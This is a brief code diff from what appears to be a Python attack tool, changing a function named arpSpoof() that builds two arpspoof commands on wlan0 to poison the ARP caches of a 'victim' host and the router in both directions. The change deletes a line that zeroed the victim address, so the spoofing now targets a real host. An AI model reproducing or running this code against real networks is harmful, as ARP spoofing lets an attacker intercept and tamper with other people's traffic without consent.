@@ -1820,7 +1820,6 @@ def arpSpoof():
     routerIp = (str(res).split("'")[1])[:-2]
     print(routerIp)
     print(victimIP)
-    victimIP = 0
     cmd1 = "arpspoof -i wlan0 -t "+ str(victimIP) +" "+ str(routerIp)
     cmd2  = "arpspoof -i wlan0 -t "+ str(routerIp) +" "+ str(victimIP)
     cmd3 = cmd1 + "&\n"+cmd2
